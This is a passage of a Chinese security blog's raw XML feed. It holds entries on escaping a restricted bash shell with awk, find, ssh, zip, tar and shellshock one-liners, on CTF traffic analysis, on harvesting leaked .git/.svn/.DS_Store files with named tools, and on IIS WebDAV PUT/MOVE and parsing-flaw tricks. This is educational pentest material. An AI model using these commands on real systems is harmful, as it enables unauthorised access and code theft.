&#123;system(&quot;&#x2F;bin&#x2F;sh&quot;)&#125;&#39;</span><br><span class="line">sh-4.2$ awk &#39;BEGIN &#123;system(&quot;&#x2F;bin&#x2F;bash&quot;)&#125;&#39;</span><br><span class="line">[steady@gongxinao ~]$ </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10) 使用 find &gt; find &#x2F; -name test -exec &#x2F;bin&#x2F;sh 或者 &#x2F;bin&#x2F;bash \;</span><br></pre></td></tr></table></figure><h4 id="其他技术"><a href="#其他技术" class="headerlink" title="其他技术"></a>其他技术</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1)使用 ssh &gt; ssh username@IP - t &quot;&#x2F;bin&#x2F;sh&quot; 或者 &quot;&#x2F;bin&#x2F;bash&quot;</span><br><span class="line">2)使用 ssh2 &gt; ssh username@IP -t &quot;bash --noprofile&quot;</span><br><span class="line">3)使用 ssh3 &gt; ssh username@IP -t &quot;() &#123; :; &#125;; &#x2F;bin&#x2F;bash&quot; (shellshock)</span><br><span class="line">通过ssh链接当前IP的当前用户并启动&#x2F;bin&#x2F;bash，主要用到了ssh命令的t参数。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">4)使用 ssh4 &gt; ssh -o ProxyCommand&#x3D;&quot;sh -c &#x2F;tmp&#x2F;yourfile.sh&quot; 127.0.0.1 (SUID)</span><br><span class="line">5)使用 git &gt; git help status &gt; ，然后就可以运行 !&#x2F;bin&#x2F;bash了</span><br><span class="line">6)使用 pico &gt; pico -s &quot;&#x2F;bin&#x2F;bash&quot; ，然后就可以对 &#x2F;bin&#x2F;bash 执行写操作，最后执行 CTRL + T</span><br><span class="line">7)使用 zip &gt; zip &#x2F;tmp&#x2F;test.zip &#x2F;tmp&#x2F;test -T --unzip-command&#x3D;&quot;sh -c&#x2F;bin&#x2F;bash&quot;</span><br><span class="line">8)使用 tar &gt; tar cf &#x2F;dev&#x2F;null testfile --checkpoint&#x3D;1 --checkpointaction&#x3D;exec&#x3D;&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><h4 id="设置环境变量"><a href="#设置环境变量" class="headerlink" title="设置环境变量"></a>设置环境变量</h4><p>查看当前用户是否对环境变量有写的权限。如果有w权限我们就可以修改。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">declare -x PATH=<span class="string">&quot;/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:/home/steady/.local/bin:/home/steady/bin&quot;</span></span><br><span class="line">declare -x PWD=<span class="string">&quot;/home/steady&quot;</span></span><br><span class="line">declare -x QT_IM_MODULE=<span class="string">&quot;ibus&quot;</span></span><br><span class="line">declare -x SESSION_MANAGER=<span class="string">&quot;local/unix:@/tmp/.ICE-unix/1942,unix/unix:/tmp/.ICE-unix/1942&quot;</span></span><br><span class="line">declare -x SHELL=<span class="string">&quot;/bin/bash&quot;</span></span><br></pre></td></tr></table></figure><p>如果具有写入的权限，呢么我们可以把/bin/bash添加到环境变量$PATH中。$PATH是一个Linux的环境变量，用于命令搜索。</p><p>/bin是系统的一些指令。bin为binary的简写主要放置一些系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar等。当时我们输入pwd的时候计算机首先去/bin中去查找，发现存在pwd命令，可以使用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[a]&#x3D;&#x2F;bin&#x2F;sh;a</span><br><span class="line">export PATH&#x3D;$PATH:&#x2F;bin</span><br><span class="line">export PATH&#x3D;$PATH:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p>所以我们在讲/bin/bash输入到PATH中，我们输入/bin/bash就会切换一个shell。进而达到了绕过rbash的目的。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Rbash绕过&quot;&gt;&lt;a href=&quot;#Rbash绕过&quot; class=&quot;headerlink&quot; title=&quot;Rbash绕过&quot;&gt;&lt;/a&gt;Rbash绕过&lt;/h1&gt;&lt;h3 id=&quot;什么是受限shell环境&quot;&gt;&lt;a href=&quot;#什么是受限shell环境&quot; class=&quot;</summary>
      
    
    
    
    <category term="Linux提权" scheme="http://s1eady.top/categories/Linux%E6%8F%90%E6%9D%83/"/>
    
    
    <category term="Linux" scheme="http://s1eady.top/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>流量分析</title>
    <link href="http://s1eady.top/2019/05/02/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90--%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/"/>
    <id>http://s1eady.top/2019/05/02/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90--%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/</id>
    <published>2019-05-02T01:21:46.000Z</published>
    <updated>2020-10-20T11:35:03.847Z</updated>
    
    <content type="html"><![CDATA[<h1 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h1><h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><p>DNS即Domain Name System，域名系统，作为Internet的一个重要组成部分，和常用的协议。DNS采用53端口基于UDP协议，当数据量大时，采用TCP协议。DNS协议的作用是把域名解析到IP地址，或者实现不通域名的跳转等等。在网络安全中也常用DNS数据包作为信息的载体，以绕过防火墙等安全设施。</p><p>DNS的作用就是发送请求，收到对应域名的IP地址。但是DNS并不是一次发包，一次收回。而是需要发很多次，每一次发包都有一个十六进制数据，有利于区别是否是同一次发包。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201018151729591.png" alt="image-20201018151729591"></p><h3 id="请求包"><a href="#请求包" class="headerlink" title="请求包"></a>请求包</h3><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201018152630616.png" alt="image-20201018152630616"></p><p>TXT记录，可以用来隐藏一些信息，常用于反垃圾邮件。</p><h3 id="响应包"><a href="#响应包" class="headerlink" title="响应包"></a>响应包</h3><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201018153359145.png" alt="image-20201018153359145"></p><h3 id="CTF与DNS"><a href="#CTF与DNS" class="headerlink" title="CTF与DNS"></a>CTF与DNS</h3><p>flag通常藏在解析的域名中，拼接所有解析域名，然后进行对应的解码。</p><p>也有可能藏在TXT记录中。</p><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>SMB(全称是Server Message Block)是一个协议名，可用于在计算机间共享文件、打印机、串口等，电脑上的网上邻居就是靠它实现的。通过 SMB 协议，客户端应用程序可以在各种网络环境下读、写服务器上的文件，以及对服务器程序提出服务请求。通过 SMB 协议，应用程序可以访问远程服务器端的文件、以及打印机等资源。SMB 使用下列端口：TCP/139、TCP/445。</p><h3 id="Wireshark与SMB"><a href="#Wireshark与SMB" class="headerlink" title="Wireshark与SMB"></a>Wireshark与SMB</h3><p>首先客户端发送一个SMB negotiate protocol request请求数据报，并列出它所支持的所有SMB协议版本。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/CC56FEC4-D77A-4B24-8151-02EC90078831.png" alt="CC56FEC4-D77A-4B24-8151-02EC90078831"></p><p>服务器收到请求信息后响应请求，并列出希望使用的协议版本。如果没有可使用的协议版本则返回0XFFFFH。</p><p>协议确定后，客户端进程向服务器发起一个用户或共享的认证，这个过程是通过发送session setup request请求数据报实现的。客户端发送一对用户名和密码或一个简单密码到服务器。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201019184710866.png" alt="image-20201019184710866"></p><p>当客户端和服务器完成了磋商和认证之后，它会发送一个Tree connect rerquest SMB数据报并列出它想访问网络资源的名称。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/8419145A-E06F-463D-A5F2-D4208A739E51.png" alt="8419145A-E06F-463D-A5F2-D4208A739E51"></p><p>之后服务器会发送一个tree connect response应答数据报以表示此次连接是否被接受或拒绝</p><p>连接到相应资源后，SMB客户端就能够干一些读、写(需要有权限)等操作了。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/4F7FB594-ED85-45BE-9311-0BD88EE3EDC8.png" alt="4F7FB594-ED85-45BE-9311-0BD88EE3EDC8"></p><p>对于传输的文件，可以直接使用wireshark打开。</p><h3 id="CTF与SMB"><a href="#CTF与SMB" class="headerlink" title="CTF与SMB"></a>CTF与SMB</h3><p>flag通常藏在传输的文件中。</p><h2 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h2><p>CTF与ICMP</p><p>ICMP数据包中的data字段可能藏有flag。另外Ping命令的TTL值也需要格外关注一下，frame.len、data.len的长度也要多注意一下，比较快捷的做法就是直接搜索flag这些敏感字段(一个字符一个字符搜索)，根据规律判断某一个数据对应的字符串是否为flag。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201019194830318.png" alt="image-20201019194830318"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;流量分析&quot;&gt;&lt;a href=&quot;#流量分析&quot; class=&quot;headerlink&quot; title=&quot;流量分析&quot;&gt;&lt;/a&gt;流量分析&lt;/h1&gt;&lt;h2 id=&quot;DNS&quot;&gt;&lt;a href=&quot;#DNS&quot; class=&quot;headerlink&quot; title=&quot;DNS&quot;&gt;&lt;/a&gt;DN</summary>
      
    
    
    
    <category term="CTF-流量分析" scheme="http://s1eady.top/categories/CTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CTF-流量分析" scheme="http://s1eady.top/tags/CTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>源码泄漏</title>
    <link href="http://s1eady.top/2019/05/02/%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%80%BB%E7%BB%93/"/>
    <id>http://s1eady.top/2019/05/02/%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%80%BB%E7%BB%93/</id>
    <published>2019-05-02T01:21:46.000Z</published>
    <updated>2020-10-26T02:23:39.445Z</updated>
    
    <content type="html"><![CDATA[<h3 id="git源码泄漏"><a href="#git源码泄漏" class="headerlink" title=".git源码泄漏"></a>.git源码泄漏</h3><p>Git是目前世界上最先进的分布式版本控制系统。主要作用就是用来记录我们更改之后的代码，而不必每次都去重写代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。</span><br></pre></td></tr></table></figure><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>探测：<code>URL/.git/</code></strong></p><p><strong>工具：<code>GitHack.py http://www.steady.org/.git/</code></strong></p><h3 id="Mercurial-hg"><a href="#Mercurial-hg" class="headerlink" title="Mercurial/hg"></a>Mercurial/hg</h3><p>Mercurial 是一个小型但强大的分布式 VCS 系统。</p><p>由于 Mercurial 的分布式性质，很容易在本地操作项目、通过本地提交跟踪并管理自己的更改以及在需要时把这些更改推到远程存储库。</p><h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>探测：<code>URL/.hg/</code></strong></p><p><strong>工具：<code>rip-hg.pl -v -u http://www.steady.com/.hg/</code></strong></p><h3 id="WEB-INF-web-xml-泄露"><a href="#WEB-INF-web-xml-泄露" class="headerlink" title="WEB-INF/web.xml 泄露"></a>WEB-INF/web.xml 泄露</h3><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p><p>Tomcat的WEB-INF目录，每个j2ee的web应用部署文件默认包含这个目录。我们在解决web服务器的性能缺陷以及做均衡负载或者完成一些分层结构的安全策略，在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。</p><h4 id="WEB-INF目录"><a href="#WEB-INF目录" class="headerlink" title="WEB-INF目录"></a>WEB-INF目录</h4><ul><li>WEB-INF/web.xml<br>web应用程序配置文件，描述了servlet和其他的应用组件配置及命名规则。</li><li>WEB-INF/classes<br>包含了站点所有用的class文件，包括servlet class和非servlet class</li><li>WEB-INF/lib<br>存放web应用需要的JAR文件</li><li>WEB-INF/src<br>源码目录，按照包名结构放置各个java文件</li><li>WEB-INF/database.properties<br>数据库配置文件</li><li>WEB-INF/tags<br>存放了自定义标签文件</li><li>WEB-INF/jsp<br>jsp 1.2 一下版本的文件存放位置。</li><li>WEB-INF/jsp2<br>存放jsp2.0以下版本的文件。</li><li>META-INF<br>相当于一个信息包。</li></ul><h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，Nginx不会去考虑配置其他类型引擎导致的安全问题而引入到自身的安全规范中来。</p><h4 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h4><p>修改Nginx配置文件禁止访问WEB-INF目录。</p><h3 id="SVN文件泄露"><a href="#SVN文件泄露" class="headerlink" title="SVN文件泄露"></a>SVN文件泄露</h3><p>Subversion，是一个开放源代码的版本控制系统。Subversion使用服务端—客户端的结构，当然服务端与客户端可以都运行在同一台服务器上。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射。</p><p>我们可以通过不同的网络协议，例如HTTP、SSH等，或本地文件的方式来对仓库进行操作。</p><h4 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>svnExploit</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python SvnExploit.py -u http://steady/.svn</span><br></pre></td></tr></table></figure><h3 id="常规源码泄漏"><a href="#常规源码泄漏" class="headerlink" title="常规源码泄漏"></a>常规源码泄漏</h3><p>网站源码放在web目录，直接访问对应路径即可下载源码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.steady.com/www.steady.com.zip</span><br></pre></td></tr></table></figure><h4 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>常见文件后缀</p><ul><li><strong>.rar</strong></li><li><strong>.zip</strong></li><li><strong>.7z</strong></li><li><strong>.tar.gz</strong></li><li><strong>.bak</strong></li><li><strong>.txt</strong></li><li><strong>.old</strong></li><li><strong>.temp</strong></li></ul><h3 id="CVS泄漏"><a href="#CVS泄漏" class="headerlink" title="CVS泄漏"></a>CVS泄漏</h3><p>CVS是一个C/S系统，多个开发人员通过一个中心版本控制系统来记录文件版本，从而达到保证文件同步的目的。主要是针对CVS/Root以及CVS/Entries目录，直接就可以看到泄露的信息。</p><p>CSV项目在初始化(cvs checkout <code>project</code>)的时候, 会在<code>project</code>目录下创建一个名为<code>CVS</code>的目录，其中保存了各个文件的修改和commit记录. 通过此目录可以获取代码的历史版本， 其中两个关键文件为:<code>CVS/Root</code>和<code>CVS/Entries</code>, 分别记录了项目的根信息和所有文件的结构。</p><h4 id="漏洞利用-5"><a href="#漏洞利用-5" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bk clone http:&#x2F;&#x2F;url&#x2F;name dir</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget -r --no-parent --mirror http:&#x2F;&#x2F;www.steady.com&#x2F;CVS</span><br><span class="line">cd www.steady.com &amp;&amp; cvs diff *</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">直接访问url</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dvcs-ripper （支持旧版和新版的svn，使用方法：rip-cvs.pl -v -u http:&#x2F;&#x2F;www.steady.com&#x2F;CVS&#x2F;）</span><br></pre></td></tr></table></figure><h3 id="SWP文件泄露"><a href="#SWP文件泄露" class="headerlink" title="SWP文件泄露"></a>SWP文件泄露</h3><p><strong>swp</strong>文件即<strong>swap</strong>文件，在编辑文件时产生的临时文件，为隐藏文件，如果文件未正常退出，该临时文件就会自动保存，文件名为**.xxx.swp**</p><h4 id="漏洞利用-6"><a href="#漏洞利用-6" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim打开，打开命令：vim -r steady.php.swp</span><br></pre></td></tr></table></figure><h3 id="bzr源码泄漏"><a href="#bzr源码泄漏" class="headerlink" title="bzr源码泄漏"></a>bzr源码泄漏</h3><p>bzr也是个版本控制工具，bzr在初始化项目时(bzr init/init-repo), 会在项目根目录产生名为.bzr的隐藏目录, 同样暴露了源代码和用户信息。</p><h4 id="漏洞利用-7"><a href="#漏洞利用-7" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>dvcs-ripper</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-bzr.pl -v -u http:&#x2F;&#x2F;www.example.com&#x2F;.bzr&#x2F;</span><br></pre></td></tr></table></figure><h3 id="DS-Store文件泄漏"><a href="#DS-Store文件泄漏" class="headerlink" title=".DS_Store文件泄漏"></a>.DS_Store文件泄漏</h3><p>.DS_Store(英文全称 Desktop Services Store)是一种由苹果公司的Mac OS X操作系统所创造的隐藏文件，目的在于存贮目录的自定义属性，例如文件的图标位置或者是背景色的选择。相当于 Windows 下的 desktop.ini。</p><p>在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息。</p><h4 id="漏洞利用-8"><a href="#漏洞利用-8" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><code>python ds_store_exp.py http://www.example.com/.DS_Store</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;git源码泄漏&quot;&gt;&lt;a href=&quot;#git源码泄漏&quot; class=&quot;headerlink&quot; title=&quot;.git源码泄漏&quot;&gt;&lt;/a&gt;.git源码泄漏&lt;/h3&gt;&lt;p&gt;Git是目前世界上最先进的分布式版本控制系统。主要作用就是用来记录我们更改之后的代码，而不必每次</summary>
      
    
    
    
    <category term="组件安全" scheme="http://s1eady.top/categories/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="组件安全" scheme="http://s1eady.top/tags/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>中间件漏洞</title>
    <link href="http://s1eady.top/2019/05/02/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>http://s1eady.top/2019/05/02/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</id>
    <published>2019-05-02T01:21:46.000Z</published>
    <updated>2020-10-26T02:22:47.658Z</updated>
    
    <content type="html"><![CDATA[<h1 id="中间件漏洞总结"><a href="#中间件漏洞总结" class="headerlink" title="中间件漏洞总结"></a>中间件漏洞总结</h1><h2 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h2><h3 id="PUT漏洞"><a href="#PUT漏洞" class="headerlink" title="PUT漏洞"></a>PUT漏洞</h3><p>最初是Windows NT版本的可选包，随后内置在Windows 2000、Windows XP Professional和Windows Server 2003一起发行，但在Windows XP Home版本上并没有IIS。</p><p>IIS是一种Web（网页）服务组件，其中包括Web服务器、FTP服务器、NNTP服务器和SMTP服务器，分别用于网页浏览、文件传输、新闻服务和邮件发送等方面，它使得在网络（包括互联网和局域网）上发布信息成了一件很容易的事。</p><h4 id="漏洞介绍及成因"><a href="#漏洞介绍及成因" class="headerlink" title="漏洞介绍及成因"></a>漏洞介绍及成因</h4><p>IIS Server 在 Web 服务扩展中开启了 WebDAV ，配置了可以写入的权限，造成任意文件上传。</p><p>版本：IIS6.0</p><h4 id="漏洞前提"><a href="#漏洞前提" class="headerlink" title="漏洞前提"></a>漏洞前提</h4><p>IIS 6.0开启了WebDAV并且拥有IIS来宾用户拥有写入权限，并且知道网站根目录。</p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>1）开启WebDAV 和写权限</p><p>2）利用burp测试</p><ul><li><p>抓包，将GET请求改为OPTIONS。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">options 请求属于浏览器的预检请求，查看服务器是否接受请求，预检通过后，浏览器才会去发 get， post， put， delete 等请求。</span><br></pre></td></tr></table></figure></li><li><p>用PUT上传一个txt文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PUT /test.txt HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">Content-Length:<span class="number">27</span></span><br><span class="line"></span><br><span class="line">steady <span class="keyword">is</span> very cool</span><br></pre></td></tr></table></figure><p>成功上传。</p></li><li><p>用PUT上传一个ASP文件，这时候是禁止上传ASP文件</p></li><li><p>使用MOVE请求方法，并利用刚刚上传的上去的test.txt，修改文件后缀。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MOVE &#x2F;test.txt HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Destination: http:&#x2F;&#x2F;127.0.0.1&#x2F;aaa.asp</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MOVE方式 将指定的资源移动到Destination消息头指定的位置</span><br></pre></td></tr></table></figure></li></ul><h3 id="短文件名猜解"><a href="#短文件名猜解" class="headerlink" title="短文件名猜解"></a>短文件名猜解</h3><h3 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h3><h4 id="漏洞介绍及成因-1"><a href="#漏洞介绍及成因-1" class="headerlink" title="漏洞介绍及成因"></a>漏洞介绍及成因</h4><p>在IIS6.0处理PROPFIND指令的时候，由于对url的长度没有进行有效的长度控制和检查，导致执行memcpy对虚拟路径进行构造的时候，引发栈溢出，从而导致远程代码执行。</p><h4 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>利用poc</p><h3 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h3><h4 id="漏洞介绍及成因-2"><a href="#漏洞介绍及成因-2" class="headerlink" title="漏洞介绍及成因"></a>漏洞介绍及成因</h4><p>IIS6.0 在处理含有特殊符号的文件路径时会出现逻辑错误。</p><h4 id="漏洞前提1"><a href="#漏洞前提1" class="headerlink" title="漏洞前提1"></a>漏洞前提1</h4><p>IIS6.0</p><h4 id="漏洞复现1"><a href="#漏洞复现1" class="headerlink" title="漏洞复现1"></a>漏洞复现1</h4><p>利用方式1</p><p>新建一个名字为test.asp的目录，然后访问该目录下的所有文件，都会被当作asp执行。</p><p>访问路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.asp&#x2F;1.jpg</span><br></pre></td></tr></table></figure><p>利用方式2</p><p>第二种是上传名为 “test.asp;.jpg” 的文件，虽然该文件真正的后缀名是 “.jpg”, 但由于含有特殊符号 “;” ，仍会被 IIS 当做 asp 程序执行</p><p>访问路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.asp;.jpg</span><br></pre></td></tr></table></figure><h4 id="漏洞前提2"><a href="#漏洞前提2" class="headerlink" title="漏洞前提2"></a>漏洞前提2</h4><p>IIS7.5</p><h4 id="漏洞复现2"><a href="#漏洞复现2" class="headerlink" title="漏洞复现2"></a>漏洞复现2</h4><p>URL 中文件后缀是 .php ，便无论该文件是否存在，都直接交给 php 处理，php默认开启 “cgi.fix_pathinfo”, 会对文件进行 “修理” 。若有文件 test.jpg ，访问时在其后加 /.php ，便可以把 “test.jpg/.php” 交给 php ， php 修理文件路径 “test.jpg/.php” 得到 ”test.jpg” ，该文件存在，便把该文件作为 php 程序执行了。</p><h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>1、过滤.asp/xm.jpg，通过ISApi组件过滤。</p><p>2、对新建目录文件名进行过滤，不允许新建包含‘.‘的文件。</p><p>3、限制上传的脚本执行权限，不允许执行脚本</p><h2 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h2><h3 id="apache学习"><a href="#apache学习" class="headerlink" title="apache学习"></a>apache学习</h3><h4 id="apache配置文件"><a href="#apache配置文件" class="headerlink" title="apache配置文件"></a>apache配置文件</h4><p>主要的配置文件在conf文件夹中,额外的存在于conf.d文件夹中,我们如果不想单独的去修改主要的配置文件http.d,我们可以临时的在conf.d中新建立一个conf文件,来修改和添加我们的配置,最终我们可以在主配置文件中使用命令Include去包涵我们的配置文件。</p><h4 id="apache与php的结合"><a href="#apache与php的结合" class="headerlink" title="apache与php的结合"></a>apache与php的结合</h4><p>1、CGI</p><p>2、FastCGI</p><p>3、Module</p><p>在https.conf(主配置文件)或者单独的配置文件中都可以使用&lt;IfModule&gt;指令来加载php_module。</p><h4 id="apache的配置指令"><a href="#apache的配置指令" class="headerlink" title="apache的配置指令"></a>apache的配置指令</h4><h5 id="lt-Directory-gt-指令"><a href="#lt-Directory-gt-指令" class="headerlink" title="&lt;Directory&gt;指令"></a>&lt;Directory&gt;指令</h5><p>&lt;Directory&gt;和&lt;/Directory&gt;用于封装一组指令，使之仅对某个目录及其子目录生效。</p><p>语法：&lt;Directory Directory-path&gt; … &lt;/Directory&gt;。</p><h5 id="lt-Files-gt-指令"><a href="#lt-Files-gt-指令" class="headerlink" title="&lt;Files&gt;指令"></a>&lt;Files&gt;指令</h5><p>提供基于文件名的访问控制，类似于&lt;Directory&gt;和&lt;Location&gt;指令。</p><p>语法：&lt;Files filename&gt; …&lt;/Files&gt;</p><p>&lt;Files&gt;能嵌入到&lt;Directory&gt;段中以限制它们作用的文件系统范围。</p><p>filename参数应当是一个文件名或是一个包含通配符的字符串，其中”?”匹配任何单个字符，”*”匹配任何字符串序列。在”~”字符之后同样可以使用正则表达式。</p><h5 id="lt-FilesMatch-gt-指令"><a href="#lt-FilesMatch-gt-指令" class="headerlink" title="&lt;FilesMatch&gt;指令"></a>&lt;FilesMatch&gt;指令</h5><p>包含作用于与正则表达式匹配的文件名的指令</p><p>语法&lt;FilesMatch regex&gt; …&lt;/FilesMatch&gt;</p><p>&lt;FilesMatch&gt;指令就像&lt;Files&gt;指令一样提供了针对文件名的访问控制。然而，它使用的是正则表达式。比如说：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;\.(gif|jpe?g|png)$&quot;&gt;</span><br></pre></td></tr></table></figure><p>将匹配最常见的internet图形文件格式。 </p><h5 id="lt-Location-gt-指令"><a href="#lt-Location-gt-指令" class="headerlink" title="&lt;Location&gt;指令"></a>&lt;Location&gt;指令</h5><p>将封装的指令作用于匹配的URL。</p><p>例如，拒绝访问任何以”/private”开头的URL路径。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;LocationMatch <span class="string">&quot;^/private&quot;</span>&gt;</span><br><span class="line">    Require all denied</span><br><span class="line">&lt;/LocationMatch&gt;</span><br></pre></td></tr></table></figure><h5 id="lt-LocationMatch-gt-指令"><a href="#lt-LocationMatch-gt-指令" class="headerlink" 